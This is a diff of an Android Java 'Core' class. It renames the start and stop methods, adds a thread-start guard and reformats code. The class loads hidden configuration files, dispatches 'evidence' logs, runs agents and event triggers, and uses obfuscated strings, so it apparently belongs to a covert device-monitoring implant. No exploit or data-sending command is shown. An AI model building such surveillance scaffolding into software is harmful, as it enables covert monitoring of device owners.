@@ -47,7 +47,7 @@ public class Core extends Activity implements Runnable {
 	private Resources resources;
 
 	/** The core thread. */
-	private Thread coreThread;
+	private Thread coreThread = null;
 
 	/** The content resolver. */
 	private ContentResolver contentResolver;
@@ -58,7 +58,7 @@ public class Core extends Activity implements Runnable {
 	/** The event manager. */
 	private ManagerEvent eventManager;
 	private WakeLock wl;
-	//private long queueSemaphore;
+	// private long queueSemaphore;
 	private Thread fastQueueThread;
 	private CheckAction checkActionFast;
 
@@ -71,8 +71,15 @@ public class Core extends Activity implements Runnable {
 	 *            the cr
 	 * @return true, if successful
 	 */
-	public boolean Start(final Resources r, final ContentResolver cr) {
-		coreThread = new Thread(this);
+	public boolean coreStart(final Resources r, final ContentResolver cr) {
+
+		synchronized (this) {
+			if (coreThread != null) {
+				return false;
+			}
+			coreThread = new Thread(this);
+		}
+		
 		agentManager = ManagerAgent.self();
 		eventManager = ManagerEvent.self();
 
@@ -106,7 +113,7 @@ public class Core extends Activity implements Runnable {
 	 * 
 	 * @return true, if successful
 	 */
-	public boolean Stop() {
+	public boolean coreStop() {
 		bStopCore = true;
 		stopAll();
 		if (Cfg.DEBUG) {
@@ -201,6 +208,7 @@ public class Core extends Activity implements Runnable {
 		CheckAction(int queue) {
 			this.queue = queue;
 		}
+
 		public void run() {
 			Exit ret = checkActions(queue);
 		}
@@ -222,7 +230,7 @@ public class Core extends Activity implements Runnable {
 				}
 				final Trigger[] actionIds = status.getTriggeredActions(qq);
 
-				if(actionIds.length == 0){
+				if (actionIds.length == 0) {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " (checkActions): triggered without actions: " + qq);
 					}
@@ -309,20 +317,20 @@ public class Core extends Activity implements Runnable {
 
 			// Identify the device uniquely
 			final Device device = Device.self();
-			
+
 			int ret = loadConf();
-			
+
 			if (ret == 0) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " Error: Cannot load conf"); //$NON-NLS-1$
 				}
-				
+
 				return ConfType.Error;
 			}
 
 			// Start log dispatcher
 			final LogDispatcher logDispatcher = LogDispatcher.self();
-			
+
 			if (!logDispatcher.isAlive()) {
 				logDispatcher.start();
 			}
@@ -332,7 +340,7 @@ public class Core extends Activity implements Runnable {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " eventManager FAILED"); //$NON-NLS-1$
 				}
-				
+
 				return ConfType.Error;
 			}
 
@@ -340,18 +348,17 @@ public class Core extends Activity implements Runnable {
 				Check.log(TAG + " Info: Events started"); //$NON-NLS-1$
 			}
 
-			/*if (agentManager.startAll() == false) {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " agentManager FAILED"); //$NON-NLS-1$
-				}
-				
-				return ConfType.Error;
-			}*/
+			/*
+			 * if (agentManager.startAll() == false) { if (Cfg.DEBUG) {
+			 * Check.log(TAG + " agentManager FAILED"); //$NON-NLS-1$ }
+			 * 
+			 * return ConfType.Error; }
+			 */
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Info: Agents started"); //$NON-NLS-1$
 			}
-			
+
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Core initialized"); //$NON-NLS-1$
 			}
@@ -376,7 +383,7 @@ public class Core extends Activity implements Runnable {
 	public boolean verifyNewConf() {
 		AutoFile file = new AutoFile(Path.conf() + ConfType.NewConf);
 		boolean loaded = false;
-		
+
 		if (file.exists()) {
 			loaded = loadConfFile(file, false);
 		}
@@ -415,10 +422,10 @@ public class Core extends Activity implements Runnable {
 		// get the actual configuration
 		if (!loaded) {
 			file = new AutoFile(Path.conf() + ConfType.ActualConf);
-			
+
 			if (file.exists()) {
 				loaded = loadConfFile(file, true);
-				
+
 				if (!loaded) {
 					Evidence.info(Messages.getString("30.4")); //$NON-NLS-1$
 				} else {
@@ -430,7 +437,7 @@ public class Core extends Activity implements Runnable {
 		// tries to load the resource conf
 		if (!loaded) {
 			// Open conf from resources and load it into resource
-			final byte[] resource = Utils.inputStreamToBuffer(resources.openRawResource(R.raw.config),0); // config.bin
+			final byte[] resource = Utils.inputStreamToBuffer(resources.openRawResource(R.raw.config), 0); // config.bin
 
 			// Initialize the configuration object
 			final Configuration conf = new Configuration(resource);
@@ -456,13 +463,13 @@ public class Core extends Activity implements Runnable {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (loadConfFile): " + file);
 			}
-			
+
 			final byte[] resource = file.read(8);
 			// Initialize the configuration object
 			Configuration conf = new Configuration(resource);
 			// Load the configuration
 			loaded = conf.loadConfiguration(instantiate);
-			
+
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Info: Conf file loaded: " + loaded); //$NON-NLS-1$
 			}
@@ -472,7 +479,7 @@ public class Core extends Activity implements Runnable {
 				Check.log(TAG + " (loadConfFile) Error: " + e);
 			}
 		}
-		
+
 		return loaded;
 	}
 
@@ -481,7 +488,7 @@ public class Core extends Activity implements Runnable {
 	 * 
 	 * @param action
 	 *            the action
-	 * @param baseEvent 
+	 * @param baseEvent
 	 * @return the int
 	 */
 	private Exit executeAction(final Action action, Trigger trigger) {
@@ -521,7 +528,7 @@ public class Core extends Activity implements Runnable {
 						Check.log(TAG + " Warn: (CheckActions): uninstalling"); //$NON-NLS-1$
 					}
 
-					//UninstallAction.actualExecute();
+					// UninstallAction.actualExecute();
 
 					exit = Exit.UNINSTALL;
 					break;
